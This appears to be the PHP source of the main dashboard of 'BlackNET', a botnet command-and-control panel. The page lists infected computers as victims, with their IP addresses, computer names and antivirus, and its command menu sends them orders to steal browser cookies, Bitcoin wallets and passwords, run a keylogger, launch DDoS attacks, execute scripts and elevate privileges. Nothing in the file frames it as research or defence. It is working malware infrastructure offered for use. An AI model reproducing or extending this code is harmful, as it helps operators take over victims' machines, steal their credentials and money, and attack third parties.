<?php
include 'classes/Database.php';
include 'classes/Clients.php';
include 'getcontery.php';
include 'session.php';

$client = new Clients;
$allClients = $client->getClients();
if ($user_check != $data->username || $password_check != $data->password){
  $client->redirect("logout.php");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="favico.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
    <title>BlackNET - Main Interface</title>
    <?php include 'components/css.php'; ?>
    <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
    <style type="text/css">
      .sticky{
        display: -webkit-box;
        display: -ms-flexbox;
        background-color: #e9ecef;
        height: 80px;
        right: 0;
        bottom: 0; 
        position: absolute;
        display: flex;
        width: 100%;
        flex-shrink: none;
      }
    </style>
  </head>

  <body id="page-top">
    <?php include 'components/header.php'; ?>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
       <?php if ($_SESSION['login_user'] == "admin"): ?>
        <div class="alert alert-warning alert-dismissible fade show">
         <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
         <i class="fa fa-exclamation-triangle"></i><b> Warning!</b> You are loging in as "admin" please change your <b>username</b> for better security.
        </div>
       <?php endif; ?>
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Slaves Menu</a>
            </li>
          </ol>
           <div class="row">
          <div class="col-xl-3 col-sm-6 mb-3">
            <div class="card text-white bg-primary o-hidden h-100">
              <div class="card-body">
                <div class="card-body-icon">
                  <i class="fas fa-fw fa-user"></i>
                </div>
                <div class="mr-5"><?php echo $client->countClients(); ?> Total Clients!</div>
              </div>
              <div class="card-footer text-white clearfix small z-1"></div>
            </div>
          </div>

          <div class="col-xl-3 col-sm-6 mb-3">
            <div class="card text-white bg-warning o-hidden h-100">
              <div class="card-body">
                <div class="card-body-icon">
                  <i class="fab fa-fw fa-usb"></i>
                </div>
                <div class="mr-5"><?php echo $client->countClientByUSB(); ?> USB Clients!</div>
              </div>
              <div class="card-footer text-white clearfix small z-1" ></div>
            </div>
          </div>

          <div class="col-xl-3 col-sm-6 mb-3">
            <div class="card text-white bg-success o-hidden h-100">
              <div class="card-body">
                <div class="card-body-icon">
                  <i class="fas fa-fw fa-signal"></i>
                </div>
                <div class="mr-5"><?php echo $client->countOnlineClients(); ?> Online Clients!</div>
              </div>
              <div class="card-footer text-white clearfix small z-1" ></div>
            </div>
          </div>

          <div class="col-xl-3 col-sm-6 mb-3">
            <div class="card text-white bg-danger o-hidden h-100">
              <div class="card-body">
                <div class="card-body-icon">
                  <i class="fas fa-fw fa-user-slash"></i>
                </div>
                <div class="mr-5"><?php echo $client->countOfflineClients(); ?> Offline Clients!</div>
              </div>
              <div class="card-footer text-white clearfix small z-1" ></div>
            </div>
          </div>
        </div>

          <form method="GET" action="sendcommand.php" id="Form1" name="Form1">
          <input type="text" name="csrf" hidden="" value="<?php echo($csrf)  ?>">
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-user-circle"></i>
              Bot/Slaves List</div>
            <div class="card-body">
              <div class="table-responsive display responsive nowrap">
                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                  <thead>
                    <tr>
                      <th><input <?php if(empty($allClients)){echo "disabled";}?> type="checkbox" name="select-all" id="select-all"></th>
                      <th>Victim ID</th>
                      <th>IP Address</th>
                      <th>Computer Name</th>
                      <th>User Status</th>
                      <th>Country</th>
                      <th>OS</th>
                      <th>Installed Date</th>
                      <th>Antivirus</th>
                      <th>Status</th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php foreach ($allClients as $clientData): ?>
                    <tr>
                     <td><input type="checkbox" id="client[]" name="client[]" value="<?php echo "'" . $clientData->vicid . "'"; ?>"></td>
                     <td><a href="viewuploads.php?vicid=<?php echo $clientData->vicid ?>"><?php echo $clientData->vicid; ?></a></td>
                     <td><?php echo $clientData->ipaddress; ?></td>
                     <td><?php echo $clientData->computername; ?></td>
                     <td><?php echo $clientData->is_admin; ?></td>
                     <td class="text-center">
                  <?php if ($countries[strtoupper($clientData->country)] == "Unknown"): ?>
                      <img alt="Unknown" src="flags/X.png">
                  <?php else: ?>
                      <img alt="<?php echo $countries[strtoupper($clientData->country)]; ?>" src="flags/<?php echo $clientData->country; ?>.png">
                  <?php endif; ?>
                    </td>
                    <td><?php echo $clientData->os; ?></td>
                    <td><?php echo $clientData->insdate; ?></td>
                    <td><?php echo $clientData->antivirus; ?></td>
                <?php if ($clientData->status == "Offline"): ?>
                    <td  class="align-content-center text-center text-danger"><img alt="Offline" src="imgs/offline.png"></td>
                <?php else: ?>
                    <td class="align-content-center text-center text-success"><img alt="Online" src="imgs/online.png"></td>
                <?php endif; ?>
              </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>
  </div>

          <div class="row">
          <div class="col">
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-wrench"></i>
              Commands Center
            </div>
            <div class="card-body">
            <div class="table-responsive pb-4">
                <table class="table table-bordered" width="100%" cellspacing="0">
                  <thead>
                    <tr>
                      <th>Command</th>
                      <th>Execute</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>
                      <select class="form-control" id="command" name="command">
                        <option value="nocommand" selected>Select Command</option>
                        <optgroup label="Clients Commands">
                            <option value="ping">Ping</option>
                            <option value="uploadf">Upload File</option>
                            <option value="msgbox">Show Messagebox</option>
                            <option value="tkschot">Take Screenshot</option>
                            <option value="stealps">Installed Softwares</option>
                            <option value="exec">Execute Script</option>
                            <option value="elev">Elevate User Status</option>
                        </optgroup>
                        <optgroup label="Stealers">
                            <option value="stealcookie">Steal Firefox Cookies</option>
                            <option value="stealchcookie">Steal Chrome Cookies</option>
                            <option value="stealbtc">Steal Bitcoin Wallet</option>
                            <option value="stealpassword">Execute Password Stealer</option>
                        </optgroup>
                        <optgroup label="Open Webpage">
                          <option value="openwp">Open Webpage (Visible)</option>
                          <option value="openhidden">Open Webpage (Hidden)</option>
                        </optgroup>
                        <optgroup label="DDOS Attack">
                            <option value="ddosw">Start DDOS</option>
                            <option value="stopddos">Stop DDOS</option>
                        </optgroup>
                        <optgroup label="Keylogger">
                            <option value="startkl">Start Keylogger</option>
                            <option value="getlogs">Retreive Logs</option>
                        </optgroup>
                        <optgroup label="Computer Commands">
                          <option value="shutdown">Shutdown</option>
                          <option value="restart">Restart</option>
                          <option value="logoff">Logoff</option>
                        </optgroup>
                        <optgroup label="Clients Connection">
                            <option value="close">Close Connection</option>
                            <option value="moveclient">Move Client</option>
                            <option value="blacklist">Blacklist IP</option>
                            <option value="update">Update Client</option>
                            <option value="restart">Restart Client</option>
                            <option value="uninstall">Uninstall</option>
                        </optgroup>
                      </select>
                   </td>
                   <td>
                    <button type="submit" for="Form1" class="btn btn-block btn-dark">Send Command</button>
                   </td>
                  </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
          </div>
          <div class="col">
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-map-marker-alt"></i>
              Map Visualization 
            </div>
            <div class="card-body">
              <div id="clientmap" name="clientmap"></div>
          </div>
        </div>
        </div>
      </div>
    </form>

    <?php include_once 'components/footer.php'; ?>

    <?php include_once 'components/js.php'; ?>

    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/vendor/responsive/dataTables.responsive.js"></script>
    <script src="asset/vendor/responsive/responsive.bootstrap4.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
    <script src="asset/vendor/amcharts/core.js"></script>
    <script src="asset/vendor/amcharts/maps.js"></script>
    <script src="asset/vendor/amcharts/geodata/worldLow.js"></script>
    <script src="asset/vendor/amcharts/themes/material.js"></script>
    <script>
      $('.alert').alert();
      $('#select-all').click(function(event) {if(this.checked) {$(':checkbox').each(function() { this.checked = true; });} else {$(':checkbox').each(function() { this.checked = false; });}});

      document.addEventListener("DOMContentLoaded", function(){
      am4core.ready(function() {
            am4core.useTheme(am4themes_material);
            var chart = am4core.create("clientmap", am4maps.MapChart);
            chart.geodata = am4geodata_worldLow;
            chart.projection = new am4maps.projections.Miller();


            var worldSeries = chart.series.push(new am4maps.MapPolygonSeries());
            worldSeries.useGeodata = true;
            worldSeries.exclude = ["AQ","SS","XK"];

            var polygonTemplate = worldSeries.mapPolygons.template;
            polygonTemplate.nonScalingStroke = true;
            polygonTemplate.tooltipText = "{name}: {value}";
            worldSeries.dataSource.url = "counter.php";
            worldSeries.dataSource.parser = new am4core.JSONParser();
            worldSeries.heatRules.push({"property": "fill","target": worldSeries.mapPolygons.template,"min": am4core.color("#e6e6e6"),"max": am4core.color("#007bff")});

            chart.smallMap = new am4maps.SmallMap();
            chart.smallMap.series.push(worldSeries);

            var hs = polygonTemplate.states.create("hover");
            hs.properties.fill = am4core.color("#0056b3");
          })          
      });
  </script>
  </body>
</html>